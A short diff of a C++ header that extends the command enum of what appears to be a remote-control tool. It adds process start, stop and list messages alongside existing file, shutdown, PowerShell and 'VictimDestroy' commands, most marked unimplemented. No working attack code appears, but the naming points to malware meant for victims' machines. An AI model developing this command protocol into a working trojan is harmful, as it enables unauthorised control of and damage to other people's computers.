@@ -14,6 +14,9 @@ enum MessageEnum {
     MessageListFile,        
     MessageGetFile,         
     MessageDeleteFile,      //unimplemented
+    MessageStartProcess,    //unimplemented
+    MessageStopProcess,     //unimplemented
+    MessageListProcess,     //unimplemented
     MessageShutdownMachine,
     MessageRestartMachine,
     MessageInvokePowershell,//unimplemented
@@ -21,6 +24,7 @@ enum MessageEnum {
     MessageVictimDestroy1,  //unimplemented
     MessageVictimDestroy2,  //unimplemented
     MessageVictimDestroy3,  //unimplemented
+    MessageUnknown
 };
 
 class Message {
@@ -76,6 +80,9 @@ namespace JsonDataHelper {
         return filename;
     }
 }
+
+std::string messageEnumToString(MessageEnum);
+MessageEnum messageStringToEnum(const std::string&);
 
 int assembleMessage(const char *bindata, int size, Message& msg, std::string *errorString = nullptr);
 
